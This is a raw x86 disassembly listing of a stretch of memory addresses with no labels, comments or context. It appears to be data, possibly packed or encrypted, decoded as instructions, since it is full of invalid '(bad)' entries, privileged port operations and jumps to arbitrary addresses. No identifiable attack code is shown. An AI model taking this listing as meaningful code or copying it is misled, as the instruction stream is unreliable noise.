  425748:	adc    al,0xb2
  42574a:	mov    ah,0x78
  42574c:	rol    BYTE PTR [edx],cl
  42574e:	inc    edi
  42574f:	mov    al,ds:0x8a284361
  425754:	jecxz  0x42576c
  425756:	out    dx,al
  425757:	stos   DWORD PTR es:[edi],eax
  425758:	mov    cl,0xb
  42575a:	add    ch,bh
  42575c:	dec    ecx
  42575d:	sbb    DWORD PTR [edi-0x2c],ebp
  425760:	mov    bl,ah
  425762:	push   0xffffffa0
  425764:	mov    esp,0xdac24f85
  425769:	sub    edi,ebx
  42576b:	push   cs
  42576c:	xor    DWORD PTR [esi-0x7488039d],ecx
  425772:	jmp    0xc99234bf
  425777:	sub    BYTE PTR [esi+0x52],ch
  42577a:	fs std 
  42577c:	enter  0x8acc,0xb5
  425780:	push   ss
  425781:	dec    esp
  425782:	pop    es
  425783:	aaa    
  425784:	push   esp
  425786:	cmp    edx,DWORD PTR [ebx+ebx*4]
  425789:	lods   eax,DWORD PTR fs:[esi]
  42578b:	cmp    eax,0xd2c2accc
  425790:	outs   dx,DWORD PTR ds:[esi]
  425791:	xchg   esp,eax
  425792:	test   al,dl
  425794:	or     eax,0x626ec170
  425799:	xchg   edi,eax
  42579a:	mov    bl,0xe8
  42579c:	push   es
  42579d:	cmp    al,0x53
  42579f:	and    al,0x33
  4257a1:	sbb    al,0x8
  4257a3:	pusha  
  4257a4:	xchg   ecx,eax
  4257a5:	sbb    DWORD PTR [esi+0x4a709bff],esi
  4257ab:	inc    ebx
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	fisttp QWORD PTR [eax+0x1e5d0]
  4257be:	mov    BYTE PTR [esi],al
  4257c0:	add    BYTE PTR [eax],al
  4257c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257c3:	popa   
  4257c4:	or     ch,BYTE PTR [eax+edi*8+0x3d]
  4257c8:	in     eax,0x57
  4257ca:	xchg   DWORD PTR [esi+0x30],edx
  4257cd:	fidivr DWORD PTR [esi+0x5f0a9e20]
  4257d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257d4:	ins    DWORD PTR es:[edi],dx
  4257d5:	pop    es
  4257d6:	stc    
  4257d7:	mov    al,0x92
  4257d9:	pop    ebx
  4257da:	test   eax,0x64210efa
  4257df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257e0:	in     eax,dx
  4257e1:	pop    es
  4257e2:	nop
  4257e3:	mov    esp,0x4dcb4c7e
  4257e8:	fstp   QWORD PTR [esi]
  4257ea:	call   0x3e4a:0x95828ccb
  4257f1:	pop    esp
  4257f2:	adc    cl,BYTE PTR [eax-0x51deb679]
  4257f8:	sbb    al,0x8e
  4257fa:	inc    esi
  4257fb:	add    eax,0x70a8dea3
  425800:	push   0xaf37467f
  425805:	fwait
  425806:	cmp    DWORD PTR [eax+0x5f809198],0x47d46e10
  425810:	xor    eax,0x2693d0c8
  425815:	test   eax,0x90829dc
  42581a:	fimul  DWORD PTR [edx]
  42581c:	fld    QWORD PTR [eax-0x16]
  42581f:	pop    esi
  425820:	jb     0x4257e3
  425822:	mov    dl,0x60
  425824:	push   0xffffff9e
  425826:	adc    BYTE PTR [eax+0x44],ah
  425829:	stos   BYTE PTR es:[edi],al
  42582a:	and    ebp,DWORD PTR [ebx+0x435bce18]
  425830:	mov    ah,0x40
  425832:	aas    
  425833:	in     al,0xe8
  425835:	pop    ebx
  425836:	aas    
  425837:	(bad)  
  425838:	icebp  
  425839:	jne    0x4257cd
  42583b:	mov    dl,BYTE PTR [edi-0x5f]
  42583e:	(bad)  
  42583f:	into   
  425840:	or     eax,0x7639d7af
  425845:	mov    dh,0x89
  425847:	call   0x56d608bc
  42584c:	mov    al,0xe5
  42584e:	stc    
  42584f:	and    dl,BYTE PTR [esi-0x1355be1c]
  425855:	push   es
  425856:	or     ecx,DWORD PTR [ecx+0xe]
  425859:	xor    eax,0x1be6a57b
  42585e:	xor    bh,dh
  425860:	(bad)  
  425861:	sbb    esp,DWORD PTR [ecx]
  425863:	retf   0xfe28
  425866:	pop    ebx
  425867:	aas    
  425868:	pushf  
  425869:	mov    bl,0xb4
  42586b:	shr    DWORD PTR ss:[esi],cl
  42586e:	sub    ah,BYTE PTR [esi-0x5c]
  425871:	xchg   edx,eax
  425872:	sub    al,0x3b
  425874:	sub    eax,0x3ef98323
  425879:	xchg   ebx,eax
  42587a:	ror    BYTE PTR [edx-0x25c0489b],1
  425880:	jo     0x4258fd
  425882:	sbb    al,0x9c
  425884:	mov    ebx,0x508083
  425889:	dec    eax
  42588a:	mov    dh,0x83
  42588c:	dec    edi
  42588d:	call   0x8304:0x8d74139
  425894:	pop    bp
  425896:	cmc    
  425897:	cmp    BYTE PTR [edx],dl
  425899:	sar    BYTE PTR [ecx],0xe
  42589c:	(bad)  
  42589d:	out    dx,al
  42589e:	push   ds
  42589f:	and    DWORD PTR [esi-0x33],ebx
  4258a2:	push   edi
  4258a3:	mul    DWORD PTR [esi+0x56]
  4258a6:	repnz or DWORD PTR [ebp-0x44b6821c],ecx
  4258ad:	mov    BYTE PTR [edi*2+0x5dd80ee4],dl
  4258b4:	add    DWORD PTR [edx-0x4ececf27],0x9
  4258bb:	mov    ecx,gs
  4258bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258be:	cmp    al,0x27
  4258c0:	(bad)  
  4258c1:	jnp    0x42589b
  4258c3:	cwde   
  4258c4:	fld    DWORD PTR [eax-0x59]
  4258c7:	adc    DWORD PTR [eax-0x34],edi
  4258ca:	loope  0x4258d2
  4258cc:	xor    ebp,DWORD PTR [esi+0xe114b76]
  4258d2:	hlt    
  4258d3:	xor    bh,BYTE PTR [edi]
  4258d5:	mov    edi,0x2b3c305c
  4258da:	and    eax,0x933cc99f
  4258df:	fs popf 
  4258e1:	inc    ebx
  4258e2:	or     al,0x5d
  4258e4:	or     edi,DWORD PTR [eax]
  4258e6:	ror    esi,1
  4258e8:	out    0x77,al
  4258ea:	mov    eax,0x752297d4
  4258ef:	arpl   cx,si
  4258f1:	xor    bh,BYTE PTR [ebx-0x5]
  4258f4:	mov    eax,ds:0x869b16e4
  4258f9:	sbb    al,0x33
  4258fb:	mov    esp,0xc9112616
  425900:	mov    ds:0xe87f931a,eax
  425905:	sub    al,0x63
  425907:	lods   eax,DWORD PTR ds:[esi]
  425908:	mov    dh,0xec
  42590a:	push   ds
  42590b:	jns    0x42594f
  42590d:	mov    bh,0xda
  42590f:	sbb    eax,0xcff523ce
  425914:	and    ah,bl
  425916:	aaa    
  425917:	cmp    BYTE PTR [edx+ebx*4+0x71],al
  42591b:	xor    ch,bl
  42591d:	mov    ebp,0xe7a93ffc
  425922:	or     esi,edi
  425924:	fidivr DWORD PTR [esi+0x4ac5e3ab]
  42592a:	lods   al,BYTE PTR ds:[esi]
  42592b:	cmp    eax,0xf2559a51
  425930:	shl    DWORD PTR [eax+ebx*1],cl
  425933:	and    DWORD PTR [esp+edx*2+0x5357df0e],edx
  42593a:	out    0xb,al
  42593c:	(bad)  
  42593e:	aas    
  42593f:	push   ds
  425940:	cli    
  425941:	inc    edx
  425942:	jg     0x4259a8
  425944:	inc    ebp
  425945:	add    edx,DWORD PTR [esi-0xc318845]
  42594b:	xchg   esi,eax
  42594c:	or     al,0x47
  42594e:	popa   
  42594f:	sub    BYTE PTR [edx+edx*2-0x4b],bl
  425953:	sub    ecx,ecx
  425955:	test   eax,0x73ef7782
  42595a:	push   esp
  42595b:	test   al,0xad
  42595d:	dec    esp
  42595e:	js     0x42597c
  425960:	jno    0x42596d
  425962:	push   ecx
  425963:	or     DWORD PTR [eax+0x5a],esp
  425966:	or     eax,0xccd10d79
  42596b:	out    dx,eax
  42596c:	add    BYTE PTR [edx],al
  42596e:	sub    eax,0xe25988eb
  425973:	cld    
  425974:	pop    es
  425975:	inc    ebx
  425976:	jbe    0x425967
  425978:	int3   
  425979:	mov    ecx,0xdaf14e51
  42597e:	cmp    eax,esi
  425980:	jne    0x4259bc
  425982:	stc    
  425983:	jnp    0x4259b6
  425985:	mov    al,ds:0x302d5673
  42598a:	lods   al,BYTE PTR ds:[esi]
  42598b:	push   0x18
  42598d:	pop    es
  42598e:	adc    DWORD PTR [edx-0x59b9f2cd],esp
  425994:	jecxz  0x4259f5
  425996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425997:	loope  0x42599e
  425999:	inc    ebx
  42599a:	clc    
  42599b:	daa    
  42599c:	in     al,dx
  42599d:	test   al,0x2
  42599f:	into   
  4259a0:	jno    0x4259d9
  4259a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259a3:	add    edx,DWORD PTR es:[edi-0x7b07111]
  4259aa:	stos   DWORD PTR es:[edi],eax
  4259ab:	cmp    al,0xf7
  4259ad:	lock pop esp
  4259af:	pushf  
  4259b0:	stos   DWORD PTR es:[edi],eax
  4259b1:	push   ebp
  4259b2:	stos   DWORD PTR es:[edi],eax
  4259b3:	icebp  
  4259b4:	cmp    eax,0xad1ca05d
  4259b9:	push   edx
  4259ba:	and    DWORD PTR [edx-0x57],esp
  4259bd:	lock mov cl,0xc0
  4259c0:	mov    edi,0x4b93095a
  4259c5:	test   al,ah
  4259c7:	std    
  4259c8:	aaa    
  4259c9:	mov    esp,0xf795df0e
  4259ce:	loope  0x4259c8
  4259d0:	jle    0x425975
  4259d2:	fnstsw WORD PTR [ebp-0x1a]
  4259d5:	jmp    0x4259e4
  4259d7:	cdq    
  4259d8:	mov    ch,0xf3
  4259da:	dec    esi
  4259db:	pop    ebp
  4259dc:	mov    ch,0xec
  4259de:	xchg   esp,eax
  4259df:	push   cs
  4259e0:	mov    ecx,0xe3d3743f
  4259e5:	stc    
  4259e6:	sbb    ecx,DWORD PTR [edi]
  4259e8:	cmp    eax,0x2bc04f8b
  4259ed:	fisttp DWORD PTR [edi-0x7146178]
  4259f3:	dec    esp
  4259f4:	cmp    dl,BYTE PTR [ebp-0x7c]
  4259f7:	push   cs
  4259f8:	jl     0x4259cd
  4259fa:	pusha  
  4259fb:	xchg   esp,eax
  4259fc:	or     eax,0xc50e926b
  425a01:	mov    al,0x6f
  425a03:	dec    ebp
  425a04:	and    BYTE PTR [ebx-0x54],cl
  425a07:	cmc    
  425a08:	ins    DWORD PTR es:[edi],dx
  425a09:	pop    ss
  425a0a:	add    DWORD PTR [ecx-0x4384b99e],edx
  425a10:	aad    0x86
  425a12:	cwde   
  425a13:	stos   DWORD PTR es:[edi],eax
  425a14:	push   DWORD PTR [ebp-0x4882ceef]
  425a1a:	aam    0xb2
  425a1c:	in     al,dx
  425a1d:	ss js  0x425a15
  425a20:	cmp    BYTE PTR [edx-0x49],ch
  425a23:	push   esi
  425a24:	jo     0x4259b7
  425a26:	xor    ch,BYTE PTR [edi-0x60]
  425a29:	stos   DWORD PTR es:[edi],eax
  425a2a:	in     eax,dx
  425a2b:	and    esi,ebp
  425a2d:	ins    BYTE PTR es:[edi],dx
  425a2e:	pop    ds
  425a2f:	push   ds
  425a30:	leave  
  425a31:	shl    BYTE PTR gs:[edi],1
  425a34:	(bad)  
  425a35:	cld    
  425a36:	out    dx,al
  425a37:	clc    
  425a38:	dec    ebx
  425a39:	sbb    esi,DWORD PTR [esi]
  425a3b:	fmul   DWORD PTR [ebx+0x0]
  425a3e:	add    BYTE PTR [edx-0x17],cl
  425a41:	push   ds
  425a42:	pop    eax
  425a43:	jge    0x425a5b
  425a45:	cmp    BYTE PTR [ebp+ebx*1+0x5e0cdbc1],0x8c
  425a4d:	and    DWORD PTR [esi+0xd7b748b],0xd90d0da7
  425a57:	nop
  425a58:	enter  0xa5da,0xbb
  425a5c:	jbe    0x425a3d
  425a5e:	adc    al,0xc1
  425a60:	mov    BYTE PTR [eax+0x32],ah
  425a63:	aaa    
  425a64:	pop    es
  425a65:	xchg   al,ch
  425a67:	and    DWORD PTR [esi+eax*2],0xffffffec
  425a6b:	lahf   
  425a6c:	(bad)  
  425a6d:	pop    ds
  425a6e:	hlt    
  425a6f:	retf   0x365b
  425a72:	lods   eax,DWORD PTR ds:[esi]
  425a73:	xchg   esp,eax
  425a74:	ins    BYTE PTR es:[edi],dx
  425a75:	jb     0x425aad
  425a77:	cmp    edx,DWORD PTR [ecx+0x2a]
  425a7a:	jp     0x425ad0
  425a7c:	lods   al,BYTE PTR ds:[esi]
  425a7d:	mov    al,0xd6
  425a7f:	ja     0x425a30
  425a81:	(bad)  
  425a82:	jbe    0x425a85
  425a84:	xor    cl,BYTE PTR ds:0x2ba74637
  425a8a:	das    
  425a8b:	mov    eax,0xa069daa5
  425a90:	jae    0x425a57
  425a92:	sbb    BYTE PTR [ecx-0x454a06ab],dl
  425a98:	loopne 0x425a67
  425a9a:	fwait
  425a9b:	pushf  
  425a9c:	in     al,dx
  425a9d:	les    esi,FWORD PTR [ecx]
  425a9f:	jmp    DWORD PTR [ecx-0x2d]
  425aa2:	stos   BYTE PTR es:[edi],al
  425aa3:	jae    0x425a2d
  425aa5:	jmp    DWORD PTR [ebx+0x5113cbad]
  425aab:	push   esi
  425aac:	xchg   BYTE PTR [edi+0x27],dl
  425aaf:	leave  
  425ab0:	imul   ebp,DWORD PTR [ebp-0x38],0x21e6e14
  425ab7:	mov    eax,0xc822ba2b
  425abc:	inc    esi
  425abd:	xor    bh,BYTE PTR [ecx]
  425abf:	push   edx
  425ac0:	leave  
  425ac1:	inc    ecx
  425ac2:	jne    0x425a74
  425ac4:	dec    ecx
  425ac5:	loope  0x425ad9
  425ac7:	hlt    
  425ac8:	cmc    
  425ac9:	xchg   BYTE PTR [edi+0x1e],dh
  425acc:	mov    esp,0xdee9ad0d
  425ad1:	xor    eax,0x9a76b0b5
  425ad6:	iret   
  425ad7:	adc    eax,DWORD PTR [esi+edx*8]
  425ada:	es mov esp,0xdd3320da
  425ae0:	xor    bh,ch
  425ae2:	xchg   esi,edi
  425ae4:	pop    ss
  425ae5:	add    edx,DWORD PTR [edx]
  425ae7:	and    eax,0x4075812c
  425aec:	push   ebp
  425aed:	and    eax,0x40d82559
  425af2:	pushf  
  425af3:	mov    DWORD PTR [esi+0x2b5a2c97],edi
  425af9:	add    ebp,DWORD PTR [ecx-0x651b064e]
  425aff:	retf   
  425b00:	mov    ah,0xdd
  425b02:	in     al,dx
  425b03:	ja     0x425ada
  425b05:	adc    BYTE PTR [ebp+0x2f1a9448],ah
  425b0b:	sub    BYTE PTR [edx+0x742e531e],dh
  425b11:	and    BYTE PTR [ebx-0x363f7ad3],0x27
  425b18:	pop    edi
  425b19:	shl    BYTE PTR [ebp-0x18],cl
  425b1c:	shl    BYTE PTR [edx+0x1f],cl
  425b1f:	repz test BYTE PTR [edx+edx*1],al
  425b23:	stc    
  425b24:	test   eax,0x81d30e9b
  425b29:	lea    ecx,ss:0x7f2fddf
  425b30:	add    BYTE PTR [edi-0x14],bl
  425b33:	jl     0x425b9a
  425b35:	mov    BYTE PTR [eax+0x4d],al
  425b38:	sbb    ecx,DWORD PTR [ebx+0x53de3b2c]
  425b3e:	pop    ebp
  425b3f:	adc    ecx,DWORD PTR [eax]
  425b41:	cmp    ebx,DWORD PTR [edx]
  425b43:	xor    BYTE PTR [esi],ch
  425b45:	or     al,0x70
  425b47:	dec    edi
  425b48:	xor    DWORD PTR [edx+0x7],esp
  425b4b:	sub    bh,BYTE PTR [ebx]
  425b4d:	jbe    0x425b6a
  425b4f:	mov    esp,0x1803accf
  425b54:	ss ss dec ebx
  425b57:	lock push esp
  425b59:	call   0x9fea3402
  425b5e:	mov    edx,0x15ccf843
  425b63:	adc    eax,0x5677f977
  425b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b69:	push   cs
  425b6a:	pop    es
  425b6b:	lahf   
  425b6c:	iret   
  425b6d:	adc    BYTE PTR [ecx-0x7e0dc6ac],dl
  425b73:	rcl    BYTE PTR [ecx],1
  425b75:	adc    dl,dl
  425b77:	clc    
  425b78:	inc    ecx
  425b79:	inc    edi
  425b7a:	xchg   esp,eax
  425b7b:	arpl   WORD PTR [ebp+0x29],si
  425b7e:	or     eax,0x56d2ed69
  425b83:	dec    edx
  425b84:	(bad)  
  425b85:	fs xchg edi,eax
  425b87:	jae    0x425bdc
  425b89:	popf   
  425b8a:	mov    edi,0xa935937b
  425b8f:	ss and al,0xbc
  425b92:	out    0x24,al
  425b94:	mov    ds:0xa1179ddb,al
  425b99:	retf   0xb163
  425b9c:	arpl   bp,bp
  425b9e:	cs das 
  425ba0:	mov    ds:0xb9c5a4e2,al
  425ba5:	pusha  
  425ba6:	adc    edi,eax
  425ba8:	(bad)  
  425ba9:	clc    
  425baa:	pop    ds
  425bab:	lds    ecx,FWORD PTR [edi+edi*8-0x3778538b]
  425bb2:	add    al,0x98
  425bb4:	mov    cl,0x4a
  425bb6:	rcr    DWORD PTR [edx+ecx*1-0x7c],1
  425bba:	cmp    BYTE PTR [ecx+0x45],al
  425bbd:	loope  0x425b6c
  425bbf:	mov    ds:0xe46e2889,eax
  425bc4:	imul   esp,DWORD PTR [ebx+0xc],0x151b4cc6
  425bcb:	pop    edx
  425bcc:	mov    DWORD PTR [edi-0x41],esp
  425bcf:	out    0x8a,eax
  425bd1:	or     DWORD PTR [edi],edx
  425bd3:	adc    BYTE PTR [ecx],ch
  425bd5:	dec    esi
  425bd6:	(bad)  
  425bd7:	cmp    cl,dl
  425bd9:	dec    ecx
  425bda:	icebp  
  425bdb:	sub    DWORD PTR [eax-0x6d09c548],ebx
  425be1:	int3   
  425be2:	dec    esi
  425be3:	stc    
  425be4:	fdiv   QWORD PTR [esi+0x6bddbc39]
  425bea:	test   al,0xcc
  425bec:	punpckldq mm7,mm2
  425bef:	inc    eax
  425bf0:	(bad)  
  425bf1:	xchg   esp,eax
  425bf2:	rol    BYTE PTR [ecx-0x6b48c7c1],1
  425bf8:	mov    esp,0x738e59d8
  425bfd:	je     0x425c60
  425bff:	outs   dx,BYTE PTR ds:[esi]
  425c00:	das    
  425c01:	call   0xd91983c6
  425c06:	lahf   
  425c07:	js     0x425ba8
  425c09:	stos   DWORD PTR es:[edi],eax
  425c0a:	pusha  
  425c0b:	daa    
  425c0c:	aad    0xfd
  425c0e:	ds sub eax,0xb6d3a0fb
  425c14:	adc    BYTE PTR [edx+0x19803fa7],0x59
  425c1b:	call   0x6056:0xc0dde0fb
  425c22:	push   ecx
  425c23:	mov    bh,0x55
  425c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c26:	or     BYTE PTR [esi+edi*2-0x30],0x92
  425c2b:	stos   DWORD PTR es:[edi],eax
  425c2c:	in     eax,dx
  425c2d:	push   cs
  425c2e:	push   ebx
  425c2f:	lock lock xchg ebx,eax
  425c32:	bound  edi,QWORD PTR [edx]
  425c34:	icebp  
  425c35:	dec    ebp
  425c36:	mov    edi,cs
  425c38:	mov    BYTE PTR [eax+0x759872f0],ch
  425c3e:	inc    ecx
  425c3f:	xor    BYTE PTR [esi+0x74],dl
  425c42:	jmp    0x7c546cf0
  425c47:	lahf   
  425c48:	mov    WORD PTR [ebx-0x3f78a825],gs
  425c4e:	sbb    edx,DWORD PTR [edi-0x6eb6a024]
  425c54:	lock jno 0x425c48
  425c57:	dec    ebp
  425c58:	repnz jmp 0xfb6a:0x8fca7ea7
  425c60:	pop    esi
  425c61:	adc    dl,bl
  425c63:	jl     0x425c2d
  425c65:	dec    esp
  425c66:	das    
  425c67:	push   esp
  425c68:	mov    eax,0x4db32c6b
  425c6d:	adc    BYTE PTR [edi-0x37],al
  425c70:	push   0x26dfd77
  425c75:	mov    al,ds:0xc045162d
  425c7a:	adc    eax,0x12ad19b3
  425c7f:	mov    ds,WORD PTR [esi+0x44]
  425c82:	clc    
  425c83:	xlat   BYTE PTR ds:[ebx]
  425c84:	ins    BYTE PTR es:[edi],dx
  425c85:	push   edi
  425c86:	cmp    eax,0xa0c6b016
  425c8b:	je     0x425c1c
  425c8d:	dec    eax
  425c8e:	jne    0x425c82
  425c90:	inc    eax
  425c91:	inc    edx
  425c92:	fbld   TBYTE PTR [ebp+0x2cb0b12c]
  425c98:	adc    esi,DWORD PTR [esi-0x42]
  425c9b:	mov    ebp,0x1805d961
  425ca0:	retf   
  425ca1:	cld    
  425ca2:	jecxz  0x425c7c
  425ca4:	in     eax,dx
  425ca5:	dec    ebx
  425ca6:	ror    eax,1
  425ca8:	xchg   ecx,eax
  425ca9:	cmp    al,0xc0
  425cab:	jmp    0x617f:0x340f3922
  425cb2:	arpl   WORD PTR [eax-0x6c955d1c],cx
  425cb8:	dec    ecx
  425cb9:	push   ds
  425cba:	adc    ch,BYTE PTR [esi+0x2b2fa6a]
  425cc0:	out    dx,eax
  425cc1:	div    BYTE PTR [ecx-0x6f]
  425cc4:	(bad)  
  425cc5:	outs   dx,BYTE PTR ds:[esi]
  425cc6:	in     eax,0x8c
  425cc8:	xor    al,0x4
  425cca:	es repz mov edx,0x4165a6ca
  425cd1:	mov    esi,0xbfee8467
  425cd6:	lahf   
  425cd7:	mov    al,ds:0x630e1f87
  425cdc:	mov    cl,0x18
  425cde:	xchg   ebx,eax
  425cdf:	pop    esp
  425ce0:	fnsave [edx]
  425ce2:	mov    cl,0xcb
  425ce4:	int    0xbe
  425ce6:	retf   0xc43f
  425ce9:	or     al,0x3
  425ceb:	fwait
  425cec:	popa   
  425ced:	xchg   ebx,eax
  425cee:	sub    BYTE PTR [esi],dh
  425cf0:	repz push ds
  425cf2:	xchg   ebx,eax
  425cf3:	add    dh,ch
  425cf5:	pusha  
  425cf6:	xchg   DWORD PTR [esi+0xa32d69],esi
  425cfc:	bound  edi,QWORD PTR [edx-0x69]
  425cff:	out    0xce,al
  425d01:	icebp  
  425d02:	popa   
  425d03:	jge    0x425d74
  425d05:	xchg   edi,eax
  425d06:	adc    BYTE PTR [eax],dl
  425d08:	(bad)  
  425d0a:	add    al,BYTE PTR [eax-0x6d]
  425d0d:	mov    ebx,0x218d49c5
  425d12:	xchg   ebp,eax
  425d13:	bound  eax,QWORD PTR [ebp-0x3e]
  425d16:	arpl   WORD PTR [ecx-0x2b],dx
  425d19:	mov    edx,0xc5fbde42
  425d1e:	pop    esi
  425d1f:	(bad)  
  425d21:	aad    0x70
  425d23:	mov    esi,0x33ff8f52
  425d28:	jmp    0x86c5c9d0
  425d2d:	or     eax,0xab60781c
  425d32:	and    eax,DWORD PTR [eax-0x66]
  425d35:	sub    cl,BYTE PTR [edi]
  425d37:	inc    esp
  425d38:	hlt    
  425d39:	push   edi
  425d3a:	dec    edi
  425d3b:	pop    esi
  425d3c:	popf   
  425d3d:	dec    edi
  425d3e:	dec    eax
  425d3f:	aad    0x92
  425d41:	adc    al,0x8b
  425d43:	jmp    DWORD PTR [edi-0x1f78d4a5]
  425d49:	(bad)  
  425d4a:	lock xchg edx,eax
  425d4c:	mov    ch,0x52
  425d4e:	rcr    BYTE PTR [ebx+0x58bda2c4],1
  425d54:	jno    0x425cfa
  425d56:	or     eax,0x7f59a247
  425d5b:	cmp    eax,esi
  425d5d:	mov    bp,WORD PTR [edx-0x28]
  425d61:	enter  0xba0c,0x92
  425d65:	jnp    0x425d46
  425d67:	cmp    ecx,esi
  425d69:	lods   eax,DWORD PTR ds:[esi]
  425d6a:	xor    BYTE PTR [esi-0x12],ch
  425d6d:	pop    ebp
  425d6e:	icebp  
  425d6f:	js     0x425daf
  425d71:	dec    ecx
  425d72:	ret    
  425d73:	test   eax,0x89ab9f6b
  425d78:	hlt    
  425d79:	mov    dh,0xdc
  425d7b:	adc    al,0x41
  425d7d:	enter  0xd6aa,0x6e
  425d81:	mov    BYTE PTR ds:0x5a325640,al
  425d87:	cmp    BYTE PTR [eax+0x55c94a2e],bh
  425d8d:	fcmovb st,st(7)
  425d8f:	xor    al,0x5f
  425d91:	mov    esi,0x8bb19fcb
  425d96:	inc    eax
  425d97:	in     al,0x26
  425d99:	cmp    edx,DWORD PTR [ebp-0xe3700da]
  425d9f:	and    eax,0xf57a6211
  425da4:	dec    edx
  425da5:	aaa    
  425da6:	lock jg 0x425dcd
  425da9:	and    eax,0xe9f08ba4
  425dae:	mov    bl,0xc6
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	mov    al,0x9e
  425db3:	push   eax
  425db4:	push   eax
  425db5:	pop    ecx
  425db6:	cmp    eax,0x2cb8070f
  425dbb:	inc    ecx
  425dbc:	cwde   
  425dbd:	dec    ebx
  425dbe:	imul   edx,DWORD PTR [ebp+eax*1-0x20ad913f],0xe061b864
  425dc9:	je     0x425d8b
  425dcb:	popa   
  425dcc:	(bad)  
  425dcd:	addr16 retf 0xbaf0
  425dd1:	popf   
  425dd2:	fisttp WORD PTR [ebx+eiz*4]
  425dd5:	mov    edi,0x46659e71
  425dda:	pcmpeqb mm2,QWORD PTR [edi-0xfb3d96c]
  425de1:	adc    esp,ebx
  425de3:	or     eax,0x42472a23
  425de8:	(bad)  
  425de9:	and    al,0x5c
  425deb:	pop    ds
  425dec:	neg    cl
  425dee:	sub    al,0x82
  425df0:	fstp   TBYTE PTR [edi]
  425df2:	enter  0x581c,0x5c
  425df6:	dec    esp
  425df7:	inc    ebx
  425df8:	dec    ecx
  425df9:	or     ebp,DWORD PTR [ecx+0x11]
  425dfc:	test   eax,0x3d5da8af
  425e01:	or     ebx,esi
  425e03:	mov    dh,BYTE PTR [esp+edi*8+0x9]
  425e07:	xor    eax,0xd766915d
  425e0c:	gs daa 
  425e0e:	jne    0x425e8e
  425e10:	nop
  425e11:	lea    ebp,[ecx]
  425e13:	icebp  
  425e14:	sub    dh,BYTE PTR [esi]
  425e16:	jl     0x425ddd
  425e18:	push   ebx
  425e19:	sar    DWORD PTR [ebx],1
  425e1b:	sub    DWORD PTR [ecx-0x72],edi
  425e1e:	or     al,0x7f
  425e20:	and    BYTE PTR [edi],bh
  425e22:	mov    al,0x43
  425e24:	push   edx
  425e25:	sub    al,0x27
  425e27:	out    dx,al
  425e28:	fwait
  425e29:	stos   DWORD PTR es:[edi],eax
  425e2a:	sar    BYTE PTR [esi-0x2bd58833],cl
  425e30:	xchg   ebx,eax
  425e31:	xchg   BYTE PTR [edi],ch
  425e33:	rcl    DWORD PTR [ebp+0x5],cl
  425e36:	xchg   ecx,eax
  425e37:	pusha  
  425e38:	jp     0x425de7
  425e3a:	mov    al,ds:0x13ac70c3
  425e3f:	inc    edx
  425e40:	xchg   ecx,eax
  425e41:	out    0xbf,al
  425e43:	jp     0x425ebd
  425e45:	xchg   ebp,eax
  425e46:	mov    ah,0x9
  425e48:	fnsave [ecx]
  425e4a:	inc    edx
  425e4b:	inc    esp
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0x84
  425e57:	(bad)  
  425e58:	std    
  425e59:	(bad)  
  425e5a:	pop    eax
  425e5b:	in     al,dx
  425e5c:	add    DWORD PTR [eax],eax
  425e5e:	mov    BYTE PTR [esi],al
  425e60:	add    BYTE PTR [eax],al
  425e62:	and    eax,0x238f6981
  425e67:	popa   
  425e68:	scas   eax,DWORD PTR es:[edi]
  425e69:	mov    al,ds:0x524922ee
  425e6e:	retf   
  425e6f:	cld    
  425e70:	sub    edi,esi
  425e72:	xor    al,0x8f
  425e74:	pusha  
  425e75:	and    cl,ah
  425e77:	inc    ecx
  425e78:	adc    esp,DWORD PTR [ecx-0xd529796]
  425e7e:	fldcw  WORD PTR [bp+di-0x1bee]
  425e83:	call   0xfc73a8c8
  425e88:	arpl   WORD PTR [edi],bp
  425e8a:	jle    0x425e19
  425e8c:	and    esp,DWORD PTR [eax+0x60]
  425e8f:	push   ebp
  425e90:	test   al,0xd3
  425e92:	xchg   esi,eax
  425e93:	mov    BYTE PTR [edx],ch
  425e95:	out    0x8b,eax
  425e97:	pop    es
  425e98:	dec    edx
  425e99:	ds mov esp,0x40253b43
  425e9f:	xor    bh,cl
  425ea1:	dec    eax
  425ea2:	loop   0x425e2a
  425ea4:	inc    esp
  425ea5:	mov    bl,0x6a
  425ea7:	pop    es
  425ea8:	lods   eax,DWORD PTR ds:[esi]
  425ea9:	in     al,dx
  425eaa:	add    cl,dl
  425eac:	adc    ch,dh
  425eae:	xor    eax,0xc65fe9a4
  425eb3:	repnz lds esi,FWORD PTR [ebx-0x28d5b8bf]
  425eba:	xchg   esp,eax
  425ebb:	and    DWORD PTR [ebx-0x51],ecx
  425ebe:	jmp    0x668dfb15
  425ec3:	mov    bl,0xeb
  425ec5:	dec    esi
  425ec6:	xor    edi,ebp
  425ec8:	mov    bh,0xff
  425eca:	mov    ah,0xee
  425ecc:	test   BYTE PTR [ebx+0x6b13f599],cl
  425ed2:	mov    ah,0x73
  425ed4:	ficomp DWORD PTR [esi-0x2f]
  425ed7:	test   DWORD PTR [eax+0x40621c6f],ebp
  425edd:	adc    al,0x85
  425edf:	pop    ebx
  425ee0:	cmp    BYTE PTR [edi+edx*1+0x7b],0x2f
  425ee5:	imul   esi,ecx,0x27
  425ee8:	pop    ebx
  425ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eea:	rcr    bh,0x63
  425eed:	xor    DWORD PTR [ecx+0x784d1326],esi
  425ef3:	mov    edi,0x99be7747
  425ef8:	jno    0x425f06
  425efa:	aad    0xb3
  425efc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425efd:	xchg   esi,eax
  425efe:	inc    ebp
  425eff:	loope  0x425f7f
  425f01:	or     ah,al
